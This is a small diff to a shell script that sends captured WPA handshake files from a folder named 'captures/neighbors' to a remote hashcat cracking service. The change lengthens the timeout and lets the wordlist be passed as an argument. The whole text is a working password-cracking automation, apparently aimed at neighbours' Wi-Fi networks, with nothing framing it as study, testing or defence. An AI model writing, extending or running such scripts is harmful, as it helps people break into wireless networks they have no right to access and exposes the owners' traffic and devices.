@@ -7,8 +7,8 @@ for cap in captures/neighbors/*.cap; do
     echo "Cracking $cap"
     curl --insecure -H "Authorization: JWT $token" \
                     -H "filename: ${cap}" \
-                    -H "timeout: 60" \
-                    -H "wordlist: phpbb.txt" \
+                    -H "timeout: 360" \
+                    -H "wordlist: $1" \
                     -H "rule: best64.rule" \
                     --data-binary "@${cap}" ${HASHCAT_WPA_URL}/upload
 done
